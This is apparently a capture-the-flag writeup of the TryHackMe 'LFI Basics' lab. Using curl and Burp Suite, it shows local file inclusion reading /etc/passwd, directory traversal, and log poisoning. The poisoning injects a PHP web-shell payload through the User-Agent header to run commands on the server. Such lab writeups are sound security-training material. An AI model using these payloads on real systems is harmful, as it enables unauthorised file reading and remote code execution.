---
title: Writeup for TryHackMe room - LFI Basics
author: 4n3i5v74
date: 2021-02-07 20:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, lfi]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [LFI Basics](https://tryhackme.com/room/lfibasics){:target="_blank"}

The tasks mentioned in this room can be done either via GUI (Browser + Burpsuite), or via CMD alone.
I prefer command line and have included following solution/hints to be done in command line.


For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}


## Task 1 - Local File Inclusion

Use these links as references.
- [What is LFI](https://dzone.com/articles/what-is-local-file-inclusion-lfi){:target="_blank"}


Deploy the machine and check for initial response, `curl <ip>`. Similar response should be obtained.
{% capture code %}{% raw %}<!DOCTYPE HTML>

<html>

<title> LFI Learning </title>

<body>

<div align="center">

<a href="./lfi/lfi.php"> <h2 style="color:black"> LFI Walkthrough 1 (Basics) </h2> </a>
<a href="./lfi2/lfi.php"> <h2 style="color:green"> LFI Walkthrough 2 (Using directory traversal) </h2> </a>
<a href="./lfi/lfi.php"> <h2 style="color:red"> LFI Walkthrough 3 (Reaching RCE using LFI and Log Poisoning) </h2> </a>

</div>

</body>

</html>{% endraw %}{% endcapture %} {% include code.html code=code %}

To access the first walkthrough, use `curl http://<ip>/lfi/lfi.php`.
A response will be obtained as,
{% capture code %}{% raw %}File included: <br><br><br>
Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}

Check adding parameter `?page=`, use `curl http://<ip>/lfi/lfi.php?page=`.
The response will be same.
{% capture code %}{% raw %}File included: <br><br><br>
Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}

Adding value to parameter `?page=home.html` gives intended result. Use `curl http://<ip>/lfi/lfi.php?page=home.html`,
{% capture code %}{% raw %}File included: home.html<br><br><br>
Local file to be used: home.html<br><br>
<h1>You included home.html</h1><br>{% endraw %}{% endcapture %} {% include code.html code=code %}

There is a vulnerable code `$local_file = $_REQUEST["page"];` in lfi.php which allows file contents to be displayed.
To display contents of `/etc/passwd` file, use `curl "http://<ip>/lfi/lfi.php?page=/etc/passwd"`,

An output similar to below will be obtained. Analyze to get non-system user.
{% capture code %}{% raw %}File included: /etc/passwd<br><br><br>
Local file to be used: /etc/passwd<br><br>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nol
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/b
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/fa
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/fals
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/b
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 2 - LFI using Directory Traversal

Use these links as references.
- [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal){:target="_blank"}


The second walkthrough can be tested by using `curl "http://<ip>/lfi2/lfi.php`.

Check if the contents of `home.html` is displayed, using `curl "http://<ip>/lfi2/lfi.php?page=home.html"`.
An output similar to following will be obtained,
{% capture code %}{% raw %}File included: home.html<br><br><br>
Local file to be used: html/home.html<br><br>
You included home.html<br>{% endraw %}{% endcapture %} {% include code.html code=code %}

There is a page `creditcard`, one level up. To get contents of the page, use `curl "http://<ip>/lfi2/lfi.php?page=../creditcard"`.
Similar output will be obtained,
{% capture code %}{% raw %}File included: ../creditcard<br><br><br>
Local file to be used: html/../creditcard<br><br>
<flag>{% endraw %}{% endcapture %} {% include code.html code=code %}

There is a vulnerable code `$local_file = "html/"$_REQUEST["page"];` in lfi.php which allows file contents to be displayed.
To display contents of `/etc/passwd` file, use `curl "http://<ip>/lfi2/lfi.php?page=../../../../../etc/passwd"`,

An output similar to below will be obtained.
{% capture code %}{% raw %}File included: ../../../../../etc/passwd<br><br><br>
Local file to be used: html/../../../../../etc/passwd<br><br>
root:x:0:0:root:/root:/bin/    bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Remote Code Execution and Log Poisoning using LFI

Use these links as references.
- [Log Injection](https://owasp.org/www-community/attacks/Log_Injection){:target="_blank"}
- [File Inclusion Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion){:target="_blank"}


To access the third walkthrough, use `curl http://<ip>/lfi/lfi.php`.
A response will be obtained as,
{% capture code %}{% raw %}File included: <br><br><br>
Local file to be used: <br><br>{% endraw %}{% endcapture %} {% include code.html code=code %}

To read contents of `/var/log/apache2/access.log` using `?page=` parameter, use `curl 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log'`.
Run the command multiple times, as the log entry will be created after execution, and one consecutive commands reveals previous log entries.

An output similar will be obtained.
{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
Local file to be used: /var/log/apache2/access.log<br><br>
<source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"{% endraw %}{% endcapture %} {% include code.html code=code %}


### Log poison using BurpSuite

Use these links as references.
- [Burpsuite Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-burpsuite){:target="_blank"}


Instructions on setting up BurpSuite can be found [here](https://blog.tryhackme.com/setting-up-burp/){:target="_blank"}

- Open the url `http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log` once in browser.
- Fire up BurpSuite.
- Set proxy in browser to 127.0.0.1:8080.
- Make sure intercept is on in BurpSuite.
- Reload the page in browser and wait for request to be intercepted in BurpSuite.
- Modify the User-Agent `Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0` in BurpSuite intercept page.
- Forward the request back to browser.
- Modify the url `http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r` in browser, and repeat the BurpSuite User-Agent modification and request forwarding.
- The response will contain the contents of `/var/log/apache2/access.log`, but the command output will be visible between `Mozilla/5.0  Firefox/78.0` of the injected log entries.

Output similar to following is intended.
{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
Local file to be used: /var/log/apache2/access.log<br><br>
<source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"
<source> - - [23/Dec/2020:00:10:33 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 419 "-" "curl/7.64.0"
<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endraw %}{% endcapture %} {% include code.html code=code %}

To get flag from lfi user's home directory, check the contents of `/home/lfi` to find file name.
Repeat the Burp process with the url `http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20/home/lfi`.
Repeat the Burp process with the url `http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt`.


### Log poison using Curl

The User-Agent can be modified in curl using either `-H` of `-A` options.

Use the following command to inject the code to log file.
{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log'{% endraw %}{% endcapture %} {% include code.html code=code %}

Use the following command to get response.
{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r'{% endraw %}{% endcapture %} {% include code.html code=code %}

Response will be similar to following.
{% capture code %}{% raw %}File included: /var/log/apache2/access.log<br><br><br>
Local file to be used: /var/log/apache2/access.log<br><br>
<source> - - [23/Dec/2020:00:10:24 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 286 "-" "curl/7.64.0"
<source> - - [23/Dec/2020:00:10:33 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 419 "-" "curl/7.64.0"
<source> - - [23/Dec/2020:00:10:51 -0800] "GET /lfi/lfi.php?page=/var/log/apache2/access.log HTTP/1.1" 200 552 "-" "Mozilla/5.0 <flag> Firefox/78.0"{% endraw %}{% endcapture %} {% include code.html code=code %}

To get flag from lfi user's home directory, check the contents of `/home/lfi` to find file name.
Use the following command,
{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=ls%20/home/lfi'{% endraw %}{% endcapture %} {% include code.html code=code %}

Get the flag, using the following command,
{% capture code %}{% raw %}curl -H $'User-Agent: Mozilla/5.0 <?php system($_GET[\'lfi\']); ?> Firefox/78.0' 'http://<ip>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=cat%20/home/lfi/flag.txt'{% endraw %}{% endcapture %} {% include code.html code=code %}

